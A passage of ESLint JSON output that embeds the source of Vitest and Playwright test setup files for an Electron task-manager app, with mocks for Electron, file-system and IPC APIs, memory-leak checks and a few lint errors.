server.on('exit', () => {\n        console.log('File watcher server stopped')\n        integrationContext.serverProcess = undefined\n        resolve()\n      })\n      \n      // Try graceful shutdown first\n      server.kill('SIGTERM')\n      \n      // Force kill after timeout\n      setTimeout(() => {\n        if (!server.killed) {\n          server.kill('SIGKILL')\n        }\n      }, 5000)\n    })\n  }\n}\n\nexport const waitForIPC = async (\n  electronApp: ElectronApplication,\n  channel: string,\n  timeout: number = IPC_RESPONSE_TIMEOUT\n): Promise<any> => {\n  return new Promise((resolve, reject) => {\n    const timer = setTimeout(() => {\n      reject(new Error(`IPC response for ${channel} not received within ${timeout}ms`))\n    }, timeout)\n    \n    // Set up IPC listener in main process\n    electronApp.evaluate(({ ipcMain }, { channel }) => {\n      return new Promise((resolve) => {\n        ipcMain.once(channel, (event, ...args) => {\n          resolve(args)\n        })\n      })\n    }, { channel }).then((result) => {\n      clearTimeout(timer)\n      resolve(result)\n    }).catch((error) => {\n      clearTimeout(timer)\n      reject(error)\n    })\n  })\n}\n\nexport const sendIPCToRenderer = async (\n  electronApp: ElectronApplication,\n  channel: string,\n  ...args: any[]\n): Promise<void> => {\n  await electronApp.evaluate(({ BrowserWindow }, { channel, args }) => {\n    const windows = BrowserWindow.getAllWindows()\n    if (windows.length > 0) {\n      windows[0].webContents.send(channel, ...args)\n    }\n  }, { channel, args })\n}\n\nexport const invokeIPCFromRenderer = async (\n  page: Page,\n  channel: string,\n  ...args: any[]\n): Promise<any> => {\n  return await page.evaluate(({ channel, args }) => {\n    if (window.electronAPI && window.electronAPI.invoke) {\n      return window.electronAPI.invoke(channel, ...args)\n    }\n    throw new Error('electronAPI not available')\n  }, { channel, args })\n}\n\nexport const simulateFileChange = async (filePath: string, content: string): Promise<void> => {\n  const fs = await import('fs/promises')\n  await fs.writeFile(filePath, content, 'utf-8')\n  \n  // Give the file watcher time to detect the change\n  await new Promise(resolve => setTimeout(resolve, 1000))\n}\n\nexport const measurePerformance = async (\n  electronApp: ElectronApplication\n): Promise<{\n  memory: NodeJS.MemoryUsage\n  cpu: number\n  windowCount: number\n}> => {\n  const memory = await electronApp.evaluate(async () => {\n    return process.memoryUsage()\n  })\n  \n  const windowCount = await electronApp.evaluate(({ BrowserWindow }) => {\n    return BrowserWindow.getAllWindows().length\n  })\n  \n  // Simple CPU measurement (not perfectly accurate but useful for testing)\n  const cpuUsageStart = process.cpuUsage()\n  await new Promise(resolve => setTimeout(resolve, 100))\n  const cpuUsageEnd = process.cpuUsage(cpuUsageStart)\n  const cpu = (cpuUsageEnd.user + cpuUsageEnd.system) / 100000 // Convert to percentage\n  \n  return { memory, cpu, windowCount }\n}\n\nexport const waitForElementWithTimeout = async (\n  page: Page,\n  selector: string,\n  timeout: number = 10000\n): Promise<void> => {\n  try {\n    await page.waitForSelector(selector, { timeout })\n  } catch (error) {\n    throw new Error(`Element ${selector} not found within ${timeout}ms`)\n  }\n}\n\nexport const takeScreenshot = async (\n  page: Page,\n  name: string\n): Promise<Buffer> => {\n  const screenshot = await page.screenshot({\n    path: join(__dirname, `../screenshots/${name}.png`),\n    fullPage: true\n  })\n  \n  return screenshot\n}\n\n// Memory leak detection for integration tests\nlet memoryBaseline: NodeJS.MemoryUsage\n\n// Global integration test setup\nbeforeAll(async () => {\n  console.log('Setting up integration test environment...')\n  \n  // Create screenshots directory\n  const fs = await import('fs/promises')\n  const screenshotsDir = join(__dirname, '../screenshots')\n  try {\n    await fs.mkdir(screenshotsDir, { recursive: true })\n  } catch (error) {\n    // Directory might already exist\n  }\n  \n  // Record initial memory usage\n  memoryBaseline = process.memoryUsage()\n}, 60000)\n\nbeforeEach(() => {\n  integrationContext.testStartTime = Date.now()\n  \n  // Set longer timeout for integration tests\n  vi.setConfig({ testTimeout: TEST_TIMEOUT })\n})\n\nafterEach(async () => {\n  const testDuration = Date.now() - integrationContext.testStartTime\n  \n  // Log slow tests\n  if (testDuration > TEST_TIMEOUT * 0.8) {\n    console.warn(`Slow integration test: ${testDuration}ms`)\n  }\n  \n  // Clean up any remaining app instances\n  await closeElectronApp()\n  \n  // Clean up server if running\n  await stopFileWatcherServer()\n  \n  // Force garbage collection if available\n  if (global.gc) {\n    global.gc()\n  }\n})\n\nafterAll(async () => {\n  console.log('Cleaning up integration test environment...')\n  \n  // Final cleanup\n  await closeElectronApp()\n  await stopFileWatcherServer()\n  \n  // Check for memory leaks\n  const finalMemory = process.memoryUsage()\n  const memoryGrowth = finalMemory.heapUsed - memoryBaseline.heapUsed\n  \n  if (memoryGrowth > 50 * 1024 * 1024) { // 50MB threshold\n    console.warn(`Potential memory leak in integration tests: ${Math.round(memoryGrowth / 1024 / 1024)}MB growth`)\n  }\n  \n  console.log('Integration test cleanup complete')\n}, 30000)\n\n// Error handling for integration tests\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection in integration test:', reason)\n})\n\nprocess.on('uncaughtException', (error) => {\n  console.error('Uncaught Exception in integration test:', error)\n})\n\n// Export the integration context for advanced test scenarios\nexport { integrationContext }\n\n// Type declarations\ndeclare global {\n  interface Window {\n    electronAPI: {\n      invoke: (channel: string, ...args: any[]) => Promise<any>\n      on: (channel: string, callback: Function) => () => void\n      off: (channel: string, callback?: Function) => void\n      send: (channel: string, ...args: any[]) => void\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/main.setup.ts","messages":[{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":165,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":165,"endColumn":40},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":166,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":166,"endColumn":43}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Main Process Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron's main process.\n * It mocks Electron APIs and provides a controlled environment for testing\n * main process functionality including app lifecycle, window management, and IPC.\n * \n * Research-based implementation following 2025 best practices for:\n * - Electron main process testing patterns\n * - Modern Node.js mocking strategies\n * - Memory leak detection integration\n * - Security validation for main process\n */\n\nimport { vi, beforeEach, afterEach, afterAll } from 'vitest'\nimport { \n  createElectronMock, \n  resetElectronMocks, \n  createMockBrowserWindow,\n  mockScenarios \n} from '../mocks/electron'\nimport { TestWindowManager, ensureAllWindowsClosed } from '../utils/window-manager'\nimport { globalCleanup, registerDefaultCleanupHandlers } from '../utils/failsafe-cleanup'\n\n// Register default cleanup handlers\nregisterDefaultCleanupHandlers()\n\n// Initialize test window manager\nconst windowManager = new TestWindowManager({\n  defaultTimeout: 30000, // 30 seconds for test windows\n  maxWindows: 10,\n  showWindows: false,\n  enableLogging: process.env.DEBUG === 'true'\n})\n\n// Register window manager cleanup with failsafe\nglobalCleanup.registerHandler('test-window-manager', async () => {\n  await windowManager.destroyAllWindows()\n}, { priority: 5, runOnce: false })\n\n// Create Electron mock instance\nconst electronMock = createElectronMock()\n\n// Mock the entire Electron module\nvi.mock('electron', () => electronMock)\n\n// Mock Node.js modules commonly used in main process\nvi.mock('fs', () => ({\n  promises: {\n    readFile: vi.fn().mockResolvedValue('{}'),\n    writeFile: vi.fn().mockResolvedValue(undefined),\n    access: vi.fn().mockResolvedValue(undefined),\n    mkdir: vi.fn().mockResolvedValue(undefined),\n    stat: vi.fn().mockResolvedValue({ isDirectory: () => true, isFile: () => false }),\n    readdir: vi.fn().mockResolvedValue([])\n  },\n  existsSync: vi.fn().mockReturnValue(true),\n  readFileSync: vi.fn().mockReturnValue('{}'),\n  writeFileSync: vi.fn(),\n  mkdirSync: vi.fn()\n}))\n\nvi.mock('path', async () => {\n  const actual = await vi.importActual('path')\n  return {\n    ...actual,\n    join: vi.fn((...args) => args.join('/')),\n    resolve: vi.fn((...args) => '/' + args.join('/'))\n  }\n})\n\nvi.mock('os', () => ({\n  homedir: vi.fn().mockReturnValue('/mock/home'),\n  platform: vi.fn().mockReturnValue('darwin'),\n  arch: vi.fn().mockReturnValue('x64'),\n  tmpdir: vi.fn().mockReturnValue('/mock/tmp'),\n  userInfo: vi.fn().mockReturnValue({ username: 'testuser' })\n}))\n\n// Mock electron-log for testing\nvi.mock('electron-log', () => ({\n  default: {\n    info: vi.fn(),\n    warn: vi.fn(),\n    error: vi.fn(),\n    debug: vi.fn(),\n    verbose: vi.fn(),\n    silly: vi.fn(),\n    transports: {\n      file: { level: 'info' },\n      console: { level: 'debug' }\n    }\n  }\n}))\n\n// Mock auto-updater\nvi.mock('electron-updater', () => ({\n  autoUpdater: {\n    checkForUpdatesAndNotify: vi.fn().mockResolvedValue(null),\n    checkForUpdates: vi.fn().mockResolvedValue(null),\n    downloadUpdate: vi.fn().mockResolvedValue([]),\n    quitAndInstall: vi.fn(),\n    on: vi.fn(),\n    off: vi.fn(),\n    setFeedURL: vi.fn(),\n    getFeedURL: vi.fn().mockReturnValue('')\n  }\n}))\n\n// Memory leak detection setup for main process tests\nlet memoryUsageBefore: NodeJS.MemoryUsage\n\n// Global test setup and teardown\nbeforeEach(() => {\n  // Reset all mocks before each test\n  resetElectronMocks(electronMock)\n  \n  // Record memory usage for leak detection\n  memoryUsageBefore = process.memoryUsage()\n  \n  // Clear window manager\n  windowManager.destroyAllWindows()\n})\n\nafterEach(async () => {\n  // Clean up all test windows\n  await windowManager.destroyAllWindows()\n  \n  // Ensure all Electron windows are closed\n  await ensureAllWindowsClosed()\n  \n  // Check for potential memory leaks\n  const memoryUsageAfter = process.memoryUsage()\n  const heapGrowth = memoryUsageAfter.heapUsed - memoryUsageBefore.heapUsed\n  \n  // Log significant memory growth (threshold: 10MB)\n  if (heapGrowth > 10 * 1024 * 1024) {\n    console.warn(`Potential memory leak detected: ${Math.round(heapGrowth / 1024 / 1024)}MB heap growth`)\n  }\n  \n  // Check window manager memory stats\n  const memoryStats = windowManager.getMemoryStats()\n  if (memoryStats.hasLeak) {\n    console.warn('Window manager detected potential memory leak', memoryStats)\n  }\n  \n  // Reset all mocks\n  vi.clearAllMocks()\n})\n\n// Global cleanup after all tests\nafterAll(async () => {\n  // Final window cleanup\n  await windowManager.destroyAllWindows()\n  await ensureAllWindowsClosed()\n  \n  // Force garbage collection if available\n  if (global.gc) {\n    global.gc()\n  }\n})\n\n// Expose utilities for tests\ndeclare global {\n  var electronMock: typeof electronMock\n  var testWindowManager: TestWindowManager\n}\n\nglobal.electronMock = electronMock\nglobal.testWindowManager = windowManager\n\n// Export for use in tests\nexport { electronMock, windowManager, mockScenarios }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/preload.setup.ts","messages":[{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":282,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":282,"endColumn":52},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":282,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":282,"endColumn":49}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Preload Process Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron's preload scripts.\n * It mocks the contextBridge and ipcRenderer APIs that are available in the preload\n * environment, ensuring secure testing of the bridge between main and renderer processes.\n * \n * Research-based implementation following 2025 best practices for:\n * - Preload script security testing patterns\n * - contextBridge API mocking strategies\n * - IPC communication validation\n * - Context isolation verification\n */\n\nimport { vi, beforeEach, afterEach } from 'vitest'\nimport { createMockIpcRenderer } from '../mocks/electron'\n\n// Mock contextBridge for preload script testing\nconst mockContextBridge = {\n  exposeInMainWorld: vi.fn().mockImplementation((key: string, api: any) => {\n    // Simulate the contextBridge behavior in tests\n    if (typeof global !== 'undefined') {\n      ;(global as any)[key] = api\n    }\n    \n    // Validate API structure for security\n    if (typeof api === 'object' && api !== null) {\n      for (const [methodName, method] of Object.entries(api)) {\n        if (typeof method !== 'function') {\n          console.warn(`Warning: Non-function property '${methodName}' exposed via contextBridge`)\n        }\n      }\n    }\n    \n    return true\n  }),\n  \n  // Mock for testing context isolation\n  isMainWorldIsolated: vi.fn().mockReturnValue(true),\n  \n  // Validation helper for testing\n  validateExposedAPI: vi.fn().mockImplementation((api: any) => {\n    // Simulate security validation that contextBridge performs\n    if (typeof api !== 'object' || api === null) {\n      throw new Error('API must be an object')\n    }\n    \n    // Check for prototype pollution attempts\n    if ('__proto__' in api || 'constructor' in api || 'prototype' in api) {\n      throw new Error('API contains prohibited properties')\n    }\n    \n    return true\n  })\n}\n\n// Create IPC renderer mock\nconst ipcRendererMock = createMockIpcRenderer()\n\n// Set up default mock responses for preload testing\nipcRendererMock.invoke = vi.fn().mockImplementation((channel: string) => {\n  switch (channel) {\n    case 'app:get-version':\n      return Promise.resolve('1.0.0-test')\n    case 'app:get-platform':\n      return Promise.resolve('darwin')\n    case 'dialog:show-open':\n      return Promise.resolve({ \n        canceled: false, \n        filePaths: ['/mock/test.json'] \n      })\n    case 'tasks:get-all':\n      return Promise.resolve([])\n    case 'tasks:save':\n      return Promise.resolve(true)\n    case 'window:minimize':\n      return Promise.resolve()\n    case 'security:validate-origin':\n      return Promise.resolve(true)\n    default:\n      console.warn(`Unhandled IPC channel in test: ${channel}`)\n      return Promise.resolve(null)\n  }\n})\n\n// Mock the entire Electron module for preload context\nvi.mock('electron', () => ({\n  contextBridge: mockContextBridge,\n  ipcRenderer: ipcRendererMock,\n  \n  // Mock other APIs that might be used in preload scripts\n  webFrame: {\n    setZoomFactor: vi.fn(),\n    getZoomFactor: vi.fn().mockReturnValue(1.0),\n    setZoomLevel: vi.fn(),\n    getZoomLevel: vi.fn().mockReturnValue(0),\n    setSpellCheckProvider: vi.fn(),\n    insertCSS: vi.fn().mockReturnValue(''),\n    removeInsertedCSS: vi.fn(),\n    executeJavaScript: vi.fn().mockResolvedValue(undefined),\n    getResourceUsage: vi.fn().mockReturnValue({\n      images: { count: 0, size: 0, liveSize: 0 },\n      scripts: { count: 0, size: 0, liveSize: 0 },\n      cssStyleSheets: { count: 0, size: 0, liveSize: 0 },\n      xslStyleSheets: { count: 0, size: 0, liveSize: 0 },\n      fonts: { count: 0, size: 0, liveSize: 0 },\n      other: { count: 0, size: 0, liveSize: 0 }\n    })\n  },\n  \n  // Security features for testing\n  nativeImage: {\n    createEmpty: vi.fn(),\n    createFromPath: vi.fn(),\n    createFromBitmap: vi.fn(),\n    createFromBuffer: vi.fn(),\n    createFromDataURL: vi.fn()\n  },\n  \n  // Crash reporter for testing error handling\n  crashReporter: {\n    start: vi.fn(),\n    getLastCrashReport: vi.fn().mockReturnValue(null),\n    getUploadedReports: vi.fn().mockReturnValue([]),\n    addExtraParameter: vi.fn(),\n    removeExtraParameter: vi.fn(),\n    getParameters: vi.fn().mockReturnValue({\n                  on: vi.fn(),\n                  off: vi.fn(),\n                  once: vi.fn(),\n                  addListener: vi.fn(),\n                  removeListener: vi.fn(),\n                  webContents: { send: vi.fn() }\n                } as any)\n  }\n}))\n\n// Mock Node.js APIs that might be accessible in preload (but should be limited)\nvi.mock('fs', () => ({\n  // Preload scripts should have limited file system access\n  promises: {\n    readFile: vi.fn().mockRejectedValue(new Error('fs access not allowed in preload')),\n    writeFile: vi.fn().mockRejectedValue(new Error('fs access not allowed in preload'))\n  }\n}))\n\nvi.mock('path', async () => {\n  // Limited path utilities that might be safe in preload\n  const actual = await vi.importActual('path')\n  return {\n    basename: actual.basename,\n    extname: actual.extname,\n    // Block dangerous path operations\n    join: vi.fn().mockImplementation(() => {\n      throw new Error('path.join access restricted in preload')\n    }),\n    resolve: vi.fn().mockImplementation(() => {\n      throw new Error('path.resolve access restricted in preload')\n    })\n  }\n})\n\n// Security validation helpers for testing\nexport const validateContextIsolation = () => {\n  // Test that context isolation is properly configured\n  return mockContextBridge.isMainWorldIsolated()\n}\n\nexport const validateAPIExposure = (key: string, expectedAPI: any) => {\n  // Verify that APIs are properly exposed through contextBridge\n  const exposedAPI = (global as any)[key]\n  \n  if (!exposedAPI) {\n    throw new Error(`API '${key}' was not exposed`)\n  }\n  \n  // Validate API structure matches expected\n  for (const [methodName, method] of Object.entries(expectedAPI)) {\n    if (typeof exposedAPI[methodName] !== typeof method) {\n      throw new Error(`Method '${methodName}' type mismatch in exposed API`)\n    }\n  }\n  \n  return true\n}\n\nexport const simulateMainWorldMessage = (channel: string, ...args: any[]) => {\n  // Simulate a message from the main process for testing\n  const event = new Event('ipc-message')\n  ;(ipcRendererMock as any)._triggerListener(channel, event, ...args)\n}\n\nexport const validateSecureAPI = (api: any) => {\n  // Validate that the API doesn't expose dangerous methods\n  const dangerousProps = ['__proto__', 'constructor', 'prototype', 'eval', 'Function']\n  \n  for (const prop of dangerousProps) {\n    if (prop in api) {\n      throw new Error(`Dangerous property '${prop}' found in API`)\n    }\n  }\n  \n  // Validate all exposed methods are functions\n  for (const [key, value] of Object.entries(api)) {\n    if (typeof value !== 'function') {\n      console.warn(`Non-function property '${key}' exposed in API`)\n    }\n  }\n  \n  return true\n}\n\n// Memory usage tracking for preload scripts\nlet memoryBaseline: number\n\n// Global test setup and teardown\nbeforeEach(() => {\n  // Clear all mocks before each test\n  vi.clearAllMocks()\n  \n  // Clear IPC renderer listeners\n  ipcRendererMock.removeAllListeners()\n  \n  // Reset context bridge state\n  if (typeof global !== 'undefined') {\n    // Clean up any previously exposed APIs\n    Object.keys(global).forEach(key => {\n      if (key.startsWith('electronAPI') || key === 'electron') {\n        delete (global as any)[key]\n      }\n    })\n  }\n  \n  // Record memory baseline\n  memoryBaseline = process.memoryUsage().heapUsed\n  \n  // Reset mock implementations\n  ipcRendererMock.invoke = vi.fn().mockImplementation((channel: string) => {\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      default:\n        return Promise.resolve(null)\n    }\n  })\n})\n\nafterEach(() => {\n  // Clean up listeners\n  ipcRendererMock.removeAllListeners()\n  \n  // Check for memory leaks in preload scripts\n  const currentMemory = process.memoryUsage().heapUsed\n  const memoryGrowth = currentMemory - memoryBaseline\n  \n  // Log significant memory growth (threshold: 5MB for preload scripts)\n  if (memoryGrowth > 5 * 1024 * 1024) {\n    console.warn(`Potential memory leak in preload script: ${Math.round(memoryGrowth / 1024 / 1024)}MB growth`)\n  }\n  \n  // Verify no dangerous APIs were exposed\n  if (typeof global !== 'undefined') {\n    Object.keys(global).forEach(key => {\n      if (key.startsWith('electronAPI') || key === 'electron') {\n        try {\n          validateSecureAPI((global as any)[key])\n        } catch (error) {\n          console.error(`Security validation failed for exposed API '${key}':`, error)\n        }\n      }\n    })\n  }\n  \n  // Reset all mocks\n  vi.resetAllMocks()\n})\n\n// Type declarations for global additions\ndeclare global {\n  var mockPreloadListeners: Map<string, Function[]>\n}\n\nexport { mockContextBridge, ipcRendererMock }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/renderer.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":300,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":304,"endColumn":4}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Renderer Process Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron's renderer process.\n * It provides React Testing Library configuration, mocks Electron APIs exposed\n * through contextBridge, and sets up proper testing environment for React components.\n * \n * Research-based implementation following 2025 best practices for:\n * - React Testing Library with Electron integration\n * - Modern jsdom/happy-dom environment setup\n * - Electron contextBridge API mocking\n * - Performance monitoring and memory tracking\n */\n\nimport { vi, beforeEach, afterEach, expect } from 'vitest'\nimport { cleanup } from '@testing-library/react'\nimport { configure } from '@testing-library/react'\nimport '@testing-library/jest-dom'\nimport { createMockIpcRenderer } from '../mocks/electron'\n\n// Import Zustand mock and resetAllStores directly\nimport { resetAllStores } from '../../__mocks__/zustand'\n\n// Configure React Testing Library for optimal performance and debugging\nconfigure({\n  testIdAttribute: 'data-testid',\n  // Increase async timeout for slower CI environments\n  asyncUtilTimeout: 10000,\n  // Better error messages for failed queries\n  getElementError: (message, container) => {\n    const error = new Error(message)\n    error.name = 'TestingLibraryElementError'\n    error.stack = null\n    return error\n  }\n})\n\n// Create IPC renderer mock\nconst ipcRendererMock = createMockIpcRenderer()\n\n// Mock window.electron API\nconst mockElectronAPI = {\n  ipcRenderer: ipcRendererMock,\n  platform: 'darwin' as const,\n  versions: {\n    node: '18.0.0',\n    chrome: '110.0.0',\n    electron: '20.0.0'\n  },\n  // TaskMaster specific APIs\n  tasks: {\n    getTasks: vi.fn().mockResolvedValue([]),\n    updateTask: vi.fn().mockResolvedValue({ success: true }),\n    createTask: vi.fn().mockResolvedValue({ success: true, id: '1' }),\n    deleteTask: vi.fn().mockResolvedValue({ success: true })\n  },\n  projects: {\n    getProjects: vi.fn().mockResolvedValue([]),\n    addProject: vi.fn().mockResolvedValue({ success: true }),\n    removeProject: vi.fn().mockResolvedValue({ success: true })\n  },\n  claude: {\n    getConfig: vi.fn().mockResolvedValue({}),\n    updateConfig: vi.fn().mockResolvedValue({ success: true }),\n    testConnection: vi.fn().mockResolvedValue({ success: true })\n  }\n}\n\n// Expose Electron API to renderer process (simulating contextBridge)\nObject.defineProperty(window, 'electronAPI', {\n  writable: true,\n  value: mockElectronAPI\n})\n\n// Also expose under legacy 'electron' namespace for backward compatibility\nObject.defineProperty(window, 'electron', {\n  writable: true,\n  value: mockElectronAPI\n})\n\n// Mock common web APIs that might not be available in test environment\nObject.defineProperty(window, 'matchMedia', {\n  writable: true,\n  value: vi.fn().mockImplementation(query => ({\n    matches: false,\n    media: query,\n    onchange: null,\n    addListener: vi.fn(), // deprecated\n    removeListener: vi.fn(), // deprecated\n    addEventListener: vi.fn(),\n    removeEventListener: vi.fn(),\n    dispatchEvent: vi.fn(),\n  })),\n})\n\n// Mock IntersectionObserver for virtual scrolling components\nObject.defineProperty(window, 'IntersectionObserver', {\n  writable: true,\n  value: vi.fn().mockImplementation(() => ({\n    observe: vi.fn(),\n    unobserve: vi.fn(),\n    disconnect: vi.fn(),\n  })),\n})\n\nObject.defineProperty(global, 'IntersectionObserver', {\n  writable: true,\n  value: window.IntersectionObserver,\n})\n\n// Mock ResizeObserver for responsive components\nObject.defineProperty(window, 'ResizeObserver', {\n  writable: true,\n  value: vi.fn().mockImplementation(() => ({\n    observe: vi.fn(),\n    unobserve: vi.fn(),\n    disconnect: vi.fn(),\n  })),\n})\n\n// Mock requestAnimationFrame for animations\nObject.defineProperty(window, 'requestAnimationFrame', {\n  writable: true,\n  value: vi.fn().mockImplementation((callback: FrameRequestCallback) => {\n    return setTimeout(() => callback(Date.now()), 16)\n  }),\n})\n\nObject.defineProperty(window, 'cancelAnimationFrame', {\n  writable: true,\n  value: vi.fn().mockImplementation((id: number) => {\n    clearTimeout(id)\n  }),\n})\n\n// Mock fetch for network requests\nglobal.fetch = vi.fn().mockImplementation(() =>\n  Promise.resolve({\n    ok: true,\n    status: 200,\n    json: () => Promise.resolve({}),\n    text: () => Promise.resolve(''),\n    blob: () => Promise.resolve(new Blob()),\n    arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),\n  })\n)\n\n// Mock URL.createObjectURL and revokeObjectURL\nObject.defineProperty(URL, 'createObjectURL', {\n  writable: true,\n  value: vi.fn().mockReturnValue('mock-object-url'),\n})\n\nObject.defineProperty(URL, 'revokeObjectURL', {\n  writable: true,\n  value: vi.fn(),\n})\n\n// Mock clipboard API\nObject.defineProperty(navigator, 'clipboard', {\n  writable: true,\n  configurable: true,\n  value: {\n    writeText: vi.fn().mockResolvedValue(undefined),\n    readText: vi.fn().mockResolvedValue('mock clipboard text'),\n  },\n})\n\n// Enhanced error boundary testing support\nwindow.addEventListener('error', (event) => {\n  console.error('Uncaught error in test:', event.error)\n})\n\nwindow.addEventListener('unhandledrejection', (event) => {\n  console.error('Unhandled promise rejection in test:', event.reason)\n})\n\n// Performance tracking for renderer tests\nlet renderStartTime: number\n\n// Global test setup and teardown\nbeforeEach(() => {\n  // Clear all mocks before each test\n  vi.clearAllMocks()\n  \n  // Reset IPC renderer mock\n  ipcRendererMock.removeAllListeners()\n  \n  // Reset mock implementations\n  ipcRendererMock.invoke = vi.fn().mockImplementation((channel: string) => {\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      case 'tasks:get-all':\n        return Promise.resolve([])\n      default:\n        return Promise.resolve(null)\n    }\n  })\n  \n  // Reset Zustand stores for test isolation\n  try {\n    resetAllStores()\n  } catch (error) {\n    // Fail silently if Zustand mock not available\n    console.warn('Zustand mock not available for store reset:', error.message)\n  }\n  \n  // Track render performance\n  renderStartTime = performance.now()\n  \n  // Clear localStorage and sessionStorage\n  window.localStorage.clear()\n  window.sessionStorage.clear()\n})\n\nafterEach(() => {\n  // Clean up React Testing Library\n  cleanup()\n  \n  // Clean up IPC mock\n  ipcRendererMock.removeAllListeners()\n  \n  // Log slow tests (threshold: 1000ms)\n  const renderTime = performance.now() - renderStartTime\n  if (renderTime > 1000) {\n    console.warn(`Slow test detected: ${Math.round(renderTime)}ms render time`)\n  }\n  \n  // Reset timers\n  vi.useRealTimers()\n  \n  // Clean up any remaining DOM event listeners\n  document.body.innerHTML = ''\n})\n\n// Utility functions for tests\nexport const mockIPCResponse = (channel: string, response: any) => {\n  ipcRendererMock.invoke = vi.fn().mockImplementation((ch: string) => {\n    if (ch === channel) {\n      return Promise.resolve(response)\n    }\n    return Promise.resolve(null)\n  })\n}\n\nexport const triggerIPCEvent = (channel: string, ...args: any[]) => {\n  const event = new Event('ipc-message')\n  ;(ipcRendererMock as any)._triggerListener(channel, event, ...args)\n}\n\nexport const waitForIPCCall = (channel: string, timeout = 5000) => {\n  return new Promise((resolve, reject) => {\n    const timer = setTimeout(() => {\n      reject(new Error(`IPC call to ${channel} not received within ${timeout}ms`))\n    }, timeout)\n    \n    const originalInvoke = ipcRendererMock.invoke as any\n    ipcRendererMock.invoke = vi.fn().mockImplementation((ch: string, ...args: any[]) => {\n      if (ch === channel) {\n        clearTimeout(timer)\n        resolve(args)\n      }\n      return originalInvoke(ch, ...args)\n    })\n  })\n}\n\n// Extend expect with custom matchers for Electron testing\nexpect.extend({\n  toHaveBeenCalledWithIPC(received, channel, ...args) {\n    const pass = received.mock.calls.some(call => \n      call[0] === channel && \n      args.every((arg, index) => call[index + 1] === arg)\n    )\n    \n    if (pass) {\n      return {\n        message: () => `Expected ${received.getMockName()} not to have been called with IPC channel \"${channel}\"`,\n        pass: true,\n      }\n    } else {\n      return {\n        message: () => `Expected ${received.getMockName()} to have been called with IPC channel \"${channel}\"`,\n        pass: false,\n      }\n    }\n  },\n})\n\n// Type declarations for global additions\ndeclare global {\n  interface Window {\n    electronAPI: typeof mockElectronAPI\n    electron: typeof mockElectronAPI\n  }\n  \n  namespace Vi {\n    interface JestAssertion<T = any> {\n      toHaveBeenCalledWithIPC(channel: string, ...args: any[]): T\n    }\n  }\n}\n\nexport { mockElectronAPI, ipcRendererMock }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/e2e.setup.ts","messages":[{"ruleId":null,"nodeType":null,"fatal":true,"severity":2,"message":"Parsing error: Merge conflict marker encountered.","line":1119,"column":0}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":1,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * TaskMaster E2E Setup and Helper Functions (2025)\n * \n * Comprehensive setup utilities for Playwright + Electron testing following\n * 2025 best practices. Provides reusable functions for app lifecycle management,\n * performance monitoring, accessibility validation, and test utilities.\n * \n * Features:\n * - Electron app launch with optimized settings\n * - Window management and configuration\n * - Performance and memory monitoring\n * - Screenshot and video utilities\n * - Accessibility testing support\n * - Cross-platform compatibility\n * - Error handling and logging\n */\n\nimport { ElectronApplication, Page, _electron as electron, type FullConfig } from '@playwright/test';\nimport { join } from 'path';\nimport { existsSync, mkdirSync } from 'fs';\nimport { join as pathJoin } from 'path';\n\n// Global variables for test session\nlet globalElectronApp: ElectronApplication | null = null;\nlet globalMainPage: Page | null = null;\n\n// 2025 Best Practice: Track all windows for debugging\nconst windowTracker = new Map<string, Page>();\nlet windowCounter = 0;\n\n/**\n * Interface for launch options\n */\ninterface LaunchOptions {\n  env?: Record<string, string>;\n  recordVideo?: boolean;\n  slowMo?: number;\n  headless?: boolean;\n  timeout?: number;\n}\n\n/**\n * Interface for performance metrics\n */\ninterface PerformanceMetrics {\n  startupTime?: number;\n  memoryUsage?: NodeJS.MemoryUsage;\n  cpuUsage?: NodeJS.CpuUsage;\n  timestamp: number;\n}\n\n/**\n * Launch Electron application with optimized settings for E2E testing\n * Following 2025 best practices for Playwright + Electron integration\n */\nexport async function launchElectronForE2E(options: LaunchOptions = {}): Promise<ElectronApplication> {\n  console.log('ðŸš€ Launching TaskMaster Electron app for E2E testing...');\n  \n  const startTime = Date.now();\n  \n  // Default environment variables for testing\n  const defaultEnv = {\n    NODE_ENV: 'test',\n    ELECTRON_IS_DEV: '0',\n    PLAYWRIGHT_TEST: '1',\n    ELECTRON_UPDATER_DISABLED: '1',\n    ELECTRON_ENABLE_LOGGING: '1',\n    CI: process.env.CI || 'false'\n  };\n\n  // 